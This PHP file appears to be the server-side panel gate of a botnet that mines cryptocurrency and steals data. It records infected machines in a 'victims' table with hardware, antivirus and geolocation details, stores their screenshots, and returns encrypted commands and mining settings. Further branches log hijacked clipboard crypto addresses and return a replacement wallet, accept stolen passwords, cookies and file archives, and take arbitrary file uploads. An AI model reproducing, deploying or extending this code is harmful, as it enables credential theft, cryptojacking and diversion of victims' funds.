<?php
include_once 'includes/db.php';
include_once 'includes/constants.php';
include_once 'includes/functions.php';



include 'includes/geoip/geoipcity.inc';
include 'includes/geoip/geoipregionvars.php';



$gi = geoip_open("includes/geoip/GeoLiteCity.dat",GEOIP_STANDARD);
$post = $_GET;


if(isset($post['h']) && isset($post['o']) && isset($post['c']) && isset($post['g']) && isset($post['w']) && isset($post['p']) && isset($post['r']) && isset($post['d']) && isset($post['f']) && isset($_POST['img']))
{
	$hwid = decrypt($post['h']);
	$os = decrypt($post['o']);
	$cpu = decrypt($post['c']);
	$gpu = decrypt($post['g']);
	$aw = decrypt($post['w']);
	$privileges = decrypt($post['p']);
	$hashrate = decrypt($post['r']);
	$profile = decrypt($post['f']);
	$ram = decrypt($post['rm']);
	$drive =  decrypt($post['d']);



	$ip = $_SERVER['REMOTE_ADDR'];


	$record = geoip_record_by_addr($gi,$ip);


	$country = $record->country_code;

	$latlng = $record->latitude.",".$record->longitude;


	$stmt = $pdo->prepare(SQL_CHECK_USER);
	$stmt->execute(array($hwid));

	if($stmt->fetchColumn() > 0)
	{
		$stmt = $pdo->prepare(SQL_UPDATE_USER);
		$stmt->execute([
			":hwid" => $hwid,
			":ip" => $ip,
			":os" => $os,
			":cpu" => $cpu,
			":gpu" => $gpu,
			":aw" => $aw,
			":priv" => $privileges,
			":hashrate" => $hashrate,
			":country" => $country,
			":latlng" => $latlng,
			":ram" => $ram,
			":drives" => $drive,
			":last_response" => time()
		]);

	}else
	{
		$stmt = $pdo->prepare(SQL_INSERT_USER);
		$stmt->execute([
			":hwid" => $hwid,
			":ip" => $ip,
			":os" => $os,
			":cpu" => $cpu,
			":gpu" => $gpu,
			":aw" => $aw,
			":priv" => $privileges,
			":hashrate" => $hashrate,
			":country" => $country,
			":last_response" => time(),
			":install_date" => time(),
			":latlng" => $latlng,
			":ram" => $ram,
			":drives" => $drive,
			":profile" => $profile
		]);
	}

	$dir = $_SERVER['DOCUMENT_ROOT'].'/uploads/images/'.$hwid.".jpeg";


	if (file_exists($dir))
	{
    unlink($dir);
	}

	$imageData = base64_decode($_POST['img']);

	$h = fopen($dir, 'w');
	fwrite($h, $imageData);
	fclose($h);

	$stmt = $pdo->prepare(SQL_DISPLAY_COMMAND);
	$stmt->execute([
		":hwid" => $hwid,
		":country" => $country,
		":profile" => $profile
	]);

	$stmt->bindColumn('id',$id);
	$stmt->bindColumn('type',$type);
	$stmt->bindColumn('args',$args);

	$cmd = "";

  $result = $pdo->prepare("SELECT start_delay,startup_delay,recover_interval,reconnect_interval,mining_status,warn_processes,warn_windows,exit_type,extensions FROM config");
	$result->execute();
	$cfg = $result->fetch();



	$stmt1= $pdo->prepare("SELECT count(*) FROM logs WHERE `hwid` = ?");
	$stmt1->execute([$hwid]);

	$steal = 0;

	if($stmt1->fetchColumn() == 0)
	{
		$steal = 1;
	}

	$commands = array();

	while ($stmt->fetch()) {
		//$cmd= $cmd.$id."&".$type.";".$args."|";
		$temp =  array();
		array_push($temp,$id,$type,$args);
		array_push($commands,$temp);
	}
	$json = array(
		'start_delay' => $cfg['start_delay'],
		'startup_interval' => $cfg['startup_delay'],
		'recover_interval' => $cfg['recover_interval'],
		'reconnect_interval'=> $cfg['reconnect_interval'],
		'mining_status' => $cfg['mining_status'],
		'warn_processes' => $cfg['warn_processes'],
		'warn_windows' => $cfg['warn_windows'],
		'exit_type'=> $cfg['exit_type'],
		'steal' => $steal,
		'steal_exten' => $cfg['extensions'],
		'commands' => $commands

	);

	$cmd = json_encode($json);

	echo encrypt($cmd);

}

if (isset($post['h']) && isset($post['s'])) {
	$hwid = decrypt($post['h']);
	$id = decrypt($post['s']);

	$stmt = $pdo->prepare(SQL_SUBMIT_COMMAND);
	$stmt->execute([$hwid,$id]);
}

if (isset($post['w']) && isset($post['h']) && isset($post['t'])) {

	$wallet = decrypt($post['w']);
	$text = decrypt($post['t']);
	$hwid = decrypt($post['h']);

	$ip = $_SERVER['REMOTE_ADDR'];
	$record = geoip_record_by_addr($gi, $ip);

$country = $record->country_code;

	$stmt = $pdo->prepare(SQL_INSERT_CLIP);
	$stmt->execute([
		":hwid" => $hwid,
		":type" => $wallet,
		":text" => $text,
		":ip" => $ip,
		":date" => time(),
		":country" => $country
	]);

	$stmt = $pdo->prepare(SQL_DISPLAY_WALLET);
	$stmt->execute([$wallet]);

	$result = $stmt->fetch();

	$result = encrypt($result["wallet"]);

	echo $result;
}

if(isset($post['hw']) && isset($post['ps']) && isset($post['ck']) && isset($post['fl'])){

	$hwid = decrypt($post['hw']);
	$pass = decrypt($post['ps']);
	$cookies = decrypt($post['ck']);
	$files = decrypt($post['fl']);

	$stmt = $pdo->prepare(SQL_CHECK_LOG);
	$stmt->execute([$hwid]);

	if ($stmt->fetchColumn() == 0) {
		$file = $hwid.".zip";
		$tmp = $_FILES['file']['tmp_name'];
		$dir = $_SERVER['DOCUMENT_ROOT'].'/uploads/'.basename($file);
		move_uploaded_file($tmp,$dir);

		if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
	 die();
	}

		$ip = $_SERVER['REMOTE_ADDR'];
		$record = geoip_record_by_addr($gi, $ip);

		$country = $record->country_code;



		$stmt= $pdo->prepare(SQL_INSERT_LOG);
		$stmt->execute([
			":hwid" => $hwid,
			":ip" => $ip,
			":country" => $country,
			":pass" => $pass,
			":cookies" => $cookies,
			":files" => $files
		]);

	}

}
if(isset($post['hw']) && isset($post['flc'])){
		$hwid = decrypt($post['hw']);
		$ip  = $_SERVER['REMOTE_ADDR'];

		$stmt = $pdo->prepare("SELECT count(*) FROM victims WHERE `hwid` = ? AND `ip` = ?");
		$stmt->execute([$hwid,$ip]);
		if($stmt->fetchColumn() == 0){
			die();
		}

		$tmp = $_FILES['file']['tmp_name'];

		$dir = $_SERVER['DOCUMENT_ROOT'].'/uploads/custom/'.$hwid."_".$_FILES['file']['name'];
		move_uploaded_file($tmp,$dir);

	if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
	 die();
	}



	}
?>
